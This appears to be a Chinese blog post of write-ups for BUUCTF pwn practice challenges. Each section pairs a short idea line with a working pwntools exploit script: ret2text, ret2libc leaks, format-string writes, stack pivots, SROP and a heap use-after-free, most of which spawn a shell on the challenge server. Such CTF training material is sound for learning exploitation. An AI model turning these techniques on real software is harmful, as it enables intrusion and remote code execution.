---
title: BUUCTF wp
date: 2024-05-29 23:39:06
category: wp
tags: 
---

> BUUCTF的部分wp
> 后面的有时间再做

# pwn
## test_your_nc
### 思路
简单题，直接nc

## rip
### 思路
程序中给了后门，直接ret2text，注意一下栈平衡

### exp
```python
from pwn import *

#p = remote("node5.buuoj.cn",29672)
p = process("pwn1")

gdb.attach(p)

backdoor = 0x401186
ret = 0x401185

payload = b'a'*15+b'b'*8+p64(backdoor)

p.sendline(payload)

p.interactive()
```

## warmup_csaw_2016
### 思路
ret2text简单题

### exp
```python
from pwn import *

p = remote("node5.buuoj.cn",25110)
#p = process("./warmup_csaw_2016")

#gdb.attach(p)

p.recvuntil(b"WOW:")
back = p.recv(8)
back = int(back,16)
payload = b'a'*(0x40+0x8)+p64(back)

p.sendline(payload)
p.interactive()
```

## ciscn_2019_n_1
### 思路
可以覆盖栈中的浮点数，也可以直接覆盖返回地址

### exp
#### 覆盖浮点数
```python
from pwn import *
import struct

p = remote("node5.buuoj.cn",28058)
#p = process("./ciscn_2019_n_1")

payload = b'a'*44+struct.pack("<fx",11.28125)

p.sendline(payload)
p.interactive()
```

#### 覆盖返回地址
```python
from pwn import *

p = remote("node5.buuoj.cn",26493)
#p = process("./ciscn_2019_n_1")

catflag_addr = 0x4006be
payload = b'a'*56+p64(catflag_addr)

p.sendline(payload)
p.interactive()
```

## pwn1_sctf_2016
### 思路
程序中替换了输入中的'I'为'you'，并赋值回原位置，从而造成了栈溢出

### exp
```python
from pwn import *

p = remote('node5.buuoj.cn',26533)
backdoor = 0x08048F0D
payload = b'I'*20+b'aaaa'+p32(backdoor)
p.sendline(payload) 
p.interactive()
```

## jarvisoj_level0
### 思路
ret2text

### exp
```python
from pwn import *

p = remote('node5.buuoj.cn',28636)

backdoor = 0x400596
payload = b'a'*(128+0x8)+p64(backdoor)
p.sendline(payload)

p.interactive()
```

## [第五空间2019 决赛]PWN5
### 思路
格式化字符串漏洞，有两种思路
1. 利用格式化字符串漏洞读取全局变量的值
2. 利用格式化字符串漏洞覆盖全局变量的值

### exp
#### 读
```python
from pwn import *

p = process("./pwn")
#p = remote("node5.buuoj.cn",27945)

bss_addr = 0x804c044

payload = p32(bss_addr)+b'%10$s'
p.sendline(payload)

p.recvuntil(b"Hello,")
num = u32(p.recv()[4:8])

#info(num)

p.sendline(str(num).encode())

p.interactive()

```

#### 写
```python
from pwn import *

context.log_level="debug"

#p = process("./pwn")
p = remote("node5.buuoj.cn",27945)

bss_addr = 0x804c044

payload = p32(bss_addr)+p32(bss_addr+1)+p32(bss_addr+2)+p32(bss_addr+3)+b'%10$n'+b'%11$n'+b'%12$n'+b'%13$n'

p.sendline(payload)

p.recvuntil(b"passwd:")
p.sendline(str(0x10101010))

p.interactive()
```

## jarvisoj_level2
### 思路
32位函数调用传参

### exp
```python
from pwn import *

p = remote('node5.buuoj.cn',27981)

hint_addr = 0x804A024
system_addr = 0x8048320

payload = b'a'*(136+4)+p32(system_addr)+p32(0)+p32(hint_addr)

p.sendline(payload)

p.interactive()
```

## ciscn_2019_n_8
### 思路
覆盖`var[13]`成0x11即可

### exp
```python
from pwn import *

p = process("./ciscn_2019_n_8")
#p = remote("node5.buuoj.cn",25702)

payload = b'a'*52+p32(0x11)

p.recvuntil("name")
p.sendline(payload)

p.interactive()
```

## bjdctf_2020_babystack
### 思路
ret2text

### exp
```python
from pwn import *

#context(log_level='debug')
#p = process("./bjdctf_2020_babystack")
p = remote("node5.buuoj.cn",27726)

backdoor = 0x4006e7

payload = b'100'
p.recvuntil(b"length")
p.sendline(payload)

payload = b'a'*16+b'b'*8+p64(backdoor)
p.recvuntil(b"What's u name?")
p.sendline(payload)

p.interactive()
```

## ciscn_2019_c_1
### 思路
ret2libc，利用puts泄露地址

### exp
```python
from pwn import *

#context.log_level = "debug"

p = remote('node5.buuoj.cn',26179)
#p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
gets_got = elf.got['gets']

pop_rdi = 0x400c83
ret = 0x4006b9
encrypt = 0x4009a0

puts_offset = 0x0809c0
system_offset = 0x04f440
binsh_offset = 0x1b3e9a

p.recvuntil(b'Input your choice!')
p.sendline(b'1')

payload = b'\x00'+b'A'*87
payload+= p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)

p.recvuntil(b'Input your Plaintext to be encrypted')
p.sendline(payload)

p.recvuntil(b"Ciphertext")
puts_addr = u64(p.recv(8)[2:8].ljust(8,b'\x00'))

info(hex(puts_addr))

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = b'\x00'+b'A'*87
payload+= p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)

p.sendline(payload)

p.interactive()
```

## get_started_3dsctf_2016
### 思路
三种思路
1. 溢出到get_flag然后再溢出到exit，使程序正常退出并给我们回显flag
2. 利用系统调用获取shell
3. 利用mprotect修改保护情况，再写shellcode

### exp
#### get_flag + exit
```python
from pwn import *

p = remote("node5.buuoj.cn",26800)
#p = process("./get_started_3dsctf_2016")
#context(log_level="debug")

param1 = 0x308cd64f
param2 = 0x195719d1
get_flag = 0x080489a0
#get_flag = 0x80489b8
exit_addr=0x804e6a0
sleep(0.1)

payload = b'a'*56
payload+=p32(get_flag)
payload+=p32(exit_addr)
payload+=p32(param1)
payload+=p32(param2)

p.sendline(payload)

p.interactive()
```

#### 系统调用
```python
from pwn import *

#p = process("./get_started_3dsctf_2016")
p = remote("node5.buuoj.cn",25556) 

pop_eax = 0x080b91e6
pop_edx_ecx_ebx = 0x0806fc30
int_0x80 = 0x0806d7e5
bin_sh = 0x80eb050
mov_edx_eax = 0x080557ab

payload = b'A'*56+p32(pop_eax)+b'/bin'+ p32(pop_edx_ecx_ebx)+p32(bin_sh)+p32(0)+p32(0)+p32(mov_edx_eax) # 写'/bin'
payload+= p32(pop_eax)+b'/sh\x00'+p32(pop_edx_ecx_ebx)+p32(bin_sh+4)+p32(0)+p32(0)+p32(mov_edx_eax) # 写'/sh\x00'
payload+= p32(pop_eax)+p32(0xb)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80) # 系统调用

p.sendline(payload)
p.interactive()
```

#### mprotect + shellcode
```python
from pwn import *

p = remote("node5.buuoj.cn",28056)
#p = process("./get_started_3dsctf_2016")
#context(log_level="debug")

param1 = 0x308cd64f
param2 = 0x195719d1
get_flag = 0x080489a0
exit_addr=0x804e6a0
mprotect_addr=0x806ec80
buf = 0x80ea000
read_addr=0x806e140
pop_3_ret=0x804f460

payload = b'a'*56
payload+=p32(mprotect_addr)
payload+=p32(pop_3_ret)
payload+=p32(buf)
payload+=p32(0x1000)
payload+=p32(0x7)
payload+=p32(read_addr)
payload+=p32(buf)
payload+=p32(0)
payload+=p32(buf)
payload+=p32(0x100)

sleep(0.1)
p.sendline(payload)
sleep(0.1)

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
p.sendline(shellcode)

p.interactive()
```

## jarvisoj_level2_x64
### 思路
64位传参

### exp
```python
from pwn import *

#p = process("./level2_x64")
p = remote("node5.buuoj.cn",25059)

context(log_level="debug")

hint = 0x600a90
system_addr = 0x400603
pop_rdi_ret = 0x4006b3

payload = b'a'*128 + b'b'*8 + p64(pop_rdi_ret) + p64(hint) + p64(system_addr)

p.recvuntil(b"Input:")
p.sendline(payload)

p.interactive()
```

## [HarekazeCTF2019]baby_rop
### 思路
64位传参

### exp
```python
from pwn import *

#p = process("./babyrop")
p = remote("node5.buuoj.cn",26483)

binsh = 0x601048
pop_rdi = 0x400683
system_addr = 0x4005E3

payload = b'A'*(16+8) + p64(pop_rdi) + p64(binsh) + p64(system_addr)

p.sendline(payload)

p.interactive()
```

## [OGeek2019]babyrop
### 思路
ret2libc，利用write泄露地址

### exp
```python
from pwn import *

#context.log_level = 'debug'

p = remote("node5.buuoj.cn",29568)
#p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")

write_plt = elf.plt['write']
write_got = elf.got['write']
main = 0x08048825

write_offset = libc.sym["write"]
system_offset = libc.sym["system"]
binsh_offset = libc.search(b"/bin/sh").__next__()

payload1 = b'\x00'+b'A'*6+b'\xFF'+b'B'*10
p.sendline(payload1)

p.recvuntil(b'Correct\n')
payload2 = b'A'*235 + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(8)
p.sendline(payload2)

write_addr = u32(p.recv(4))

#info(hex(write_addr))

libc_base = write_addr - write_offset
system_addr = libc_base + system_offset
binsh = libc_base + binsh_offset 

p.sendline(payload1)
p.recvuntil(b'Correct\n')

payload = b'A'*235+p32(system_addr)+p32(main)+p32(binsh)
p.sendline(payload)

p.interactive()
```

## others_shellcode
### 思路
直接连接就有shell了

## ciscn_2019_n_5
### 思路
ret2libc

### exp
```python
from pwn import *

#context.log_level = 'debug'

p = remote("node5.buuoj.cn",27559)
#p = process("./ciscn_2019_n_5")
elf = ELF("./ciscn_2019_n_5")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
ret = 0x4004c9
pop_rdi = 0x400713
main = 0x400636

p.recvuntil(b'name\n')
p.sendline(b'AAAA')

payload = b'A' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.recvuntil(b'me?\n')
p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
#info(hex(puts_addr))

system_addr = puts_addr - 0x31580
binsh = puts_addr + 0x1334da

p.recvuntil(b'name\n')
p.sendline(b'AAAA')

payload = b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)
p.recvuntil(b'me?\n')
p.sendline(payload)

p.interactive()
```

## not_the_same_3dsctf_2016
### 思路
利用write输出flag就好了

### exp
```python
from pwn import *

context.log_level = "debug"
p = remote("node5.buuoj.cn",27490)
#p = process("./not_the_same_3dsctf_2016")
#elf = ELF("./not_the_same_3dsctf_2016")

#write_plt = elf.plt["write"]
write_plt =0x0806E270
get_flag = 0x080489A0
flag = 0x080ECA2D
exit_addr = 0x0804E660 
main = 0x080489E0

payload = b'A'*45 + p32(get_flag) + p32(write_plt) + p32(exit_addr) + p32(1) + p32(flag) + p32(100)
p.sendline(payload)

p.interactive()
```

## ciscn_2019_en_2
### 思路
和之前第11题相同

### exp
```python
from pwn import *

# same as 11

#context.log_level = "debug"

p = remote('node5.buuoj.cn',28455)
#p = process('./ciscn_2019_en_2')
elf = ELF('./ciscn_2019_en_2')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
gets_got = elf.got['gets']

pop_rdi = 0x400c83
ret = 0x4006b9
encrypt = 0x4009a0

puts_offset = 0x0809c0
system_offset = 0x04f440
binsh_offset = 0x1b3e9a

p.recvuntil(b'Input your choice!')
p.sendline(b'1')

payload = b'\x00'+b'A'*87
payload+= p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)

p.recvuntil(b'Input your Plaintext to be encrypted')
p.sendline(payload)

p.recvuntil(b"Ciphertext")
puts_addr = u64(p.recv(8)[2:8].ljust(8,b'\x00'))

info(hex(puts_addr))

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = b'\x00'+b'A'*87
payload+= p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)

p.sendline(payload)

p.interactive()
```

## ciscn_2019_ne_5
### 思路
32位传参

### exp
```python
from pwn import *

context.log_level = 'debug'

p = remote("node5.buuoj.cn",29664)
#p = process("./ciscn_2019_ne_5")

system_addr = 0x080484D0
main = 0x08048722
binsh = 0x080482ea

def overflow(payload):
    p.recvuntil(b'password')
    p.sendline(b'administrator')

    p.recvuntil(b'operation')
    p.sendline(b'1')

    p.recvuntil(b'info')
    p.sendline(payload)

    p.recvuntil(b'operation')
    p.sendline(b'4')

payload = b'A' * 76 + p32(system_addr) + p32(main) + p32(binsh)

overflow(payload)

p.interactive()
```

## 铁人三项(第五赛区)_2018_rop
### 思路
ret2libc

### exp
```python
from pwn import *

p = remote("node5.buuoj.cn",28035)
#p = process("./2018_rop")
elf = ELF("./2018_rop")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main = 0x080484C6

payload1 = b'A'*140 + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload1)
p.recv(4)
p.sendline(payload1)
write_addr = u32(p.recv(4))

info(hex(write_addr))

system_addr = write_addr - 0xa89e0
binsh = write_addr + 0x961df

payload = b'A'*140+p32(system_addr) + p32(main) + p32(binsh)
p.sendline(payload)

p.interactive()
```

## bjdctf_2020_babystack2
### 思路
有个有符号整数与无符号整数的转换漏洞

### exp
```python
from pwn import *

p = remote("node5.buuoj.cn",25144)
#p = process("./bjdctf_2020_babystack2")

backdoor = 0x400726

p.recvuntil(b"name:")
p.sendline(b'-1')

payload = b'A' * (16+8) + p64(backdoor) 
p.recvuntil(b"name?")

p.sendline(payload)

p.interactive()
```

## bjdctf_2020_babyrop

## jarvisoj_fm
### 思路
格式化字符串漏洞

### exp
```python
from pwn import *

#p = process("./fm")
p = remote("node5.buuoj.cn",29687)
x_addr = 0x0804A02C

payload = p32(x_addr) + b'%11$n'

p.sendline(payload)

p.interactive()
```

## jarvisoj_tell_me_something

## ciscn_2019_es_2
### 思路
栈迁移
利用第一次输出泄露调用vuln函数时压入的ebp，即main_ebp
构造 `b'AAAA' + p32(system_plt) + p32(main) + p32(main_ebp-offset) + b'/bin/sh'`
调试获取main_ebp与'/bin/sh'的偏移offset
最后利用两次leave_ret转移esp，第一次是程序中的leave，用于转移ebp;第二次是leave_ret的gadget，这次会转移esp

### exp
```python
from pwn import *

p = remote("node5.buuoj.cn",26700)
#p = process("./ciscn_2019_es_2")

system_plt = 0x08048400
lev_ret = 0x080485FD
main = 0x080485FF

#gdb.attach(p)

payload1 = b'A'*0x20+b'B'*0x8
p.send(payload1)
p.recvuntil(b'BBBBBBBB')
main_ebp = u32(p.recv(4))
#info(hex(main_ebp))

payload2 = b'AAAA' + p32(system_plt) + p32(main) + p32(main_ebp-0x28) + b'/bin/sh'
payload2 = payload2.ljust(0x28,b'\x00')
payload2+= p32(main_ebp-0x38) + p32(lev_ret)
p.send(payload2)

p.interactive()
```

## HarekazeCTF2019-baby_rop2
### 思路
ret2libc

### exp
```python
from pwn import *

#context.log_level = "debug"

p = remote("node5.buuoj.cn",25568)
#p = process("./babyrop2")
elf = ELF("./babyrop2")

printf_plt = elf.plt["printf"]
printf_got = elf.got["printf"]
read_got = elf.got['read']
main = 0x400636

pop_rdi = 0x400733
pop_rsi_r15 = 0x400731
ret = 0x400734

format_s = 0x400790

#gdb.attach(p)

payload1 = b'A'*40 + p64(pop_rdi) + p64(format_s) +p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main) + b'A'*8
p.recvuntil(b"name? ")
p.sendline(payload1)
read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print(hex(read_addr))

system_addr = read_addr - 0xb1ec0
binsh = read_addr + 0x95b07

payload2 = b'A'*40 + p64(pop_rdi) + p64(binsh) + p64(system_addr)
p.sendline(payload2)

p.interactive()
```

## pwn2_sctf_2016
### 思路
ret2libc
这次用的LibcSearcher找libc

### exp
```python
from pwn import *
from LibcSearcher import *

#context.log_level = 'debug'

p = remote("node5.buuoj.cn",29615)
#p = process("./pwn2_sctf_2016")
elf = ELF("./pwn2_sctf_2016")

printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
main = 0x080485B8
call_printf = 0x080485B0
format_s = 0x08048702

p.recvuntil(b'read? ')
p.sendline(b'-1')

payload = b'A'*47 + b'B' + p32(printf_plt) + p32(main) + p32(format_s) + p32(printf_got)
p.sendline(payload)
p.recvuntil(b'B')
printf_addr = u32(p.recv()[17:21])
print(hex(printf_addr))

libc = LibcSearcher("printf",printf_addr)

printf_offset = libc.dump('printf')
system_offset = libc.dump('system')
binsh_offset = libc.dump('str_bin_sh')
libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset
binsh = libc_base + binsh_offset

p.sendline(b'-1')
payload = b'A'*48 + p32(system_addr) + p32(main) + p32(binsh)
p.sendline(payload)

p.interactive()
```

## picoctf_2018_rop_chain
### 思路
达成几个条件即可获取flag

### exp
```python
from pwn import *

#p = process('./PicoCTF_2018_rop_chain')
p = remote("node5.buuoj.cn",29755)

elf = ELF('./PicoCTF_2018_rop_chain')
gets_plt = elf.plt['gets']

win1 = 0x0804A041
win2 = 0x0804A042
flag = 0x0804862B
a1 = 0xDEADBAAD
main = 0x0804873B

pop_ebx = 0x804840d

payload1 = b'A'*28 + p32(gets_plt) + p32(main) + p32(win1) 
p.recvuntil(b"input> ")
p.sendline(payload1)
p.sendline(b'\x01\x01')

payload2 = b'A'*28 + p32(flag) + p32(main) + p32(a1)
p.recvuntil(b'input> ')
p.sendline(payload2)
p.interactive()
```
## jarvisoj_level3

## ciscn_2019_s_3
### 思路
泄露栈上的地址，计算偏移，构造'/bin/sh'字符串
之后有两个思路
1. 利用ROPgadget布置寄存器获取shell
2. 利用sigreturn布置寄存器获取shell

### exp
#### ROPgadget
```python
from pwn import *

#context.log_level = 'debug'

p = process('./ciscn_s_3')
#p = remote("node5.buuoj.cn",29806)

mov_rax_59 = 0x4004e3
mov_addr = 0x400580
pop_addr = 0x40059A
syscall = 0x400517
vuln = 0x4004ed
ret = 0x400538
pop_rdi = 0x4005a3

#gdb.attach(p)

payload1 = b'A'*16
payload1+= p64(vuln)
p.send(payload1)

#print(p.recv())

p.recv(32)
leak=u64(p.recv(8))
print(hex(leak))
binsh = leak - 0x148
ret_addr = binsh + 8

payload2 = b'/bin/sh\x00'+p64(ret)+p64(pop_addr)+p64(0)+p64(1)+p64(ret_addr)+p64(0)+p64(0)+p64(0)
payload2+=p64(mov_addr)+b'a'*7*8 + p64(mov_rax_59) +p64(pop_rdi) + p64(binsh) + p64(syscall)
p.sendline(payload2)

p.interactive()

```

#### srop
```python
from pwn import *

#context.log_level = 'debug'

context.arch = 'amd64'

p = process('./ciscn_s_3')
#p = remote("node5.buuoj.cn",28047)

mov_rax_15 = 0x4004DA
mov_rax_59 = 0x4004e3
mov_addr = 0x400580
pop_addr = 0x40059A
syscall = 0x400517
vuln = 0x4004ed
ret = 0x400538
pop_rdi = 0x4005a3

#gdb.attach(p)

payload1 = b'A'*16
payload1+= p64(vuln)
p.send(payload1)

#print(p.recv())

p.recv(32)
leak=u64(p.recv(8))
print(hex(leak))
binsh = leak - 0x118

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall

payload2 = b'/bin/sh\x00'.ljust(16,b'A') + p64(mov_rax_15) + p64(syscall) + bytes(sigframe)
p.sendline(payload2)

p.interactive()
```

## ez_pz_hackover_2016

## wustctf2020_getshell
### exp
```python
from pwn import *

#p = process("./wustctf2020_getshell")
p = remote("node5.buuoj.cn",25919)

shell = 0x0804851B
payload = b'A'*28 + p32(shell)

p.send(payload)
p.interactive()
```

## jarvisoj_level3_x64

## babyheap_0ctf_2017

## actf_2019_babyheap
### 思路
堆入门题，UAF漏洞

### exp
```python
from pwn import *

#context.log_level = 'debug'

name = "ACTF_2019_babyheap"
p = process(name)
#p = remote("node5.buuoj.cn",26688)
elf = ELF(name)

binsh=0x602010
system_plt = elf.plt["system"]

def create(size,content):
    p.sendlineafter(b"Your choice:",b"1")
    p.sendlineafter(b"Please input size:",str(size).encode())
    p.sendafter(b"Please input content:",content)

def delete(idx):
    p.sendlineafter(b"Your choice:",b"2")
    p.sendlineafter(b"Please input list index:",str(idx).encode())

def show(idx):
    p.sendlineafter(b"Your choice:",b"3")
    p.sendlineafter(b"Please input list index:",str(idx).encode())

gdb.attach(p)

create(0x100,b'A'*10)
create(0x100,b'B'*10)
#create(0x100,b'C'*10)
delete(0)
delete(1)
create(0x10,p64(binsh)+p64(system_plt))
show(0)

p.interactive()
```